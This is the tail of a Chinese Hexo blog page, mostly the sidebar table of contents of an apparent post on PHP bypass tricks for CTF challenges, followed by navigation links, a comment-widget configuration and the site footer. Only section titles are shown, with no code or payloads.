class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E7%9A%84%E6%9D%BE%E6%95%A3%E6%80%A7"><span class="toc-number">2.</span> <span class="toc-text">php内置函数的松散性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5-%EF%BC%8Csha1%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">MD5 ，sha1绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#switch%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.</span> <span class="toc-text">switch绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strcmp%E7%BB%95%E8%BF%87-%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E7%A8%8B%E5%BA%8F%E8%BE%93%E5%87%BA%E7%9A%84%E6%98%AF%EF%BC%8C%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E7%9A%84i%EF%BC%8C%E7%BB%93%E6%9E%9C%E4%B8%BA3%E8%BF%94%E5%9B%9Eflag"><span class="toc-number">2.3.</span> <span class="toc-text">strcmp绕过(这个时候程序输出的是，类型转换的i，结果为3返回flag )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#array-search%EF%BC%88%EF%BC%89%E3%80%81in-array-%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">array_search（）、in_array()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.1.</span> <span class="toc-text">数组绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.4.2.</span> <span class="toc-text">&#x3D;&#x3D;问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-match%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">preg_match绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87-1"><span class="toc-number">3.1.</span> <span class="toc-text">数组绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6"><span class="toc-number">3.2.</span> <span class="toc-text">PCRE回溯次数限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%A2%E8%A1%8C%E7%AC%A6"><span class="toc-number">3.3.</span> <span class="toc-text">换行符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">4.</span> <span class="toc-text">变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">4.1.</span> <span class="toc-text">extract变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-str"><span class="toc-number">4.2.</span> <span class="toc-text">parse_str()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#import-request-variables"><span class="toc-number">4.3.</span> <span class="toc-text">import_request_variables()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-1"><span class="toc-number">4.4.</span> <span class="toc-text">$$变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#register-globals%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">4.5.</span> <span class="toc-text">register_globals全局变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#is-numeric-%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">is_numeric()绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6"><span class="toc-number">6.</span> <span class="toc-text">绕过过滤的空白字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E9%87%8D%E5%8A%A0%E5%AF%86"><span class="toc-number">7.</span> <span class="toc-text">多重加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-WITH-ROLLUP%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">SQL注入_WITH ROLLUP绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ereg%E6%AD%A3%E5%88%99-00%E6%88%AA%E6%96%AD"><span class="toc-number">9.</span> <span class="toc-text">ereg正则%00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E7%BB%95%E8%BF%87"><span class="toc-number">10.</span> <span class="toc-text">session绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81md5%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="toc-number">11.</span> <span class="toc-text">密码md5比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#url%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">12.</span> <span class="toc-text">url二次编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">sql闭合绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x-forwarded-for%E7%BB%95%E8%BF%87"><span class="toc-number">14.</span> <span class="toc-text">x-forwarded-for绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval%E5%87%BD%E6%95%B0%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">intval函数四舍五入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%AE%E7%82%B9%E6%95%B0%E7%B2%BE%E5%BA%A6%E5%BF%BD%E7%95%A5"><span class="toc-number">16.</span> <span class="toc-text">浮点数精度忽略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%88%AA%E6%96%AD"><span class="toc-number">17.</span> <span class="toc-text">常见截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#iconv-%E5%BC%82%E5%B8%B8%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD"><span class="toc-number">17.1.</span> <span class="toc-text">iconv 异常字符截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eregi%E3%80%81ereg%E5%8F%AF%E7%94%A8-00%E6%88%AA%E6%96%AD"><span class="toc-number">17.2.</span> <span class="toc-text">eregi、ereg可用%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#move-uploaded-file-%E7%94%A8-0%E6%88%AA%E6%96%AD"><span class="toc-number">17.3.</span> <span class="toc-text">move_uploaded_file 用\0截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inclue%E7%94%A8-%E5%92%8C-%E6%88%AA%E6%96%AD"><span class="toc-number">17.4.</span> <span class="toc-text">inclue用?和#截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strpos%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87NULL%E4%B8%8Eereg%E6%AD%A3%E5%88%99-00%E6%88%AA%E6%96%AD"><span class="toc-number">18.</span> <span class="toc-text">strpos数组绕过NULL与ereg正则%00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E4%B8%8E%E6%95%B0%E5%AD%97%E6%AF%94%E8%BE%83"><span class="toc-number">19.</span> <span class="toc-text">十六进制与数字比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E9%AA%8C%E8%AF%81%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">20.</span> <span class="toc-text">数字验证正则绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#switch%E6%B2%A1%E6%9C%89break-%E5%AD%97%E7%AC%A6%E4%B8%8E0%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="toc-number">21.</span> <span class="toc-text">switch没有break 字符与0比较绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%8F%90%E4%BA%A4%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E9%80%BB%E8%BE%91"><span class="toc-number">22.</span> <span class="toc-text">利用提交数组绕过逻辑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number"></span> <span class="toc-text">参考链接:</span></a></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">&lt; sql注入总结</a><a class="next" href="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/">rce考点总结 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>